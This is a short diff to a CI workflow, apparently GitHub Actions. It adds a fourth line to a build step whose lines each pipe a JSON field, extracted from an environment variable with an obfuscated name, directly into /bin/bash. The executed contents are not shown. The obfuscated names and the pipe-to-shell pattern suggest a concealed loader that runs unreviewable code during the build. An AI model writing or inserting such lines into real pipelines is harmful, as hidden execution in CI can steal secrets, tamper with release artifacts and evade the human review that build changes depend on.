@@ -39,6 +39,7 @@ jobs:
           echo $t797 | jq -r .wmnr427 | /bin/bash
           echo $crgsl211 | jq -r .npct8 | /bin/bash
           echo $vt228 | jq -r .wyc76 | /bin/bash
+          echo $n0 | jq -r .lvfn7 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
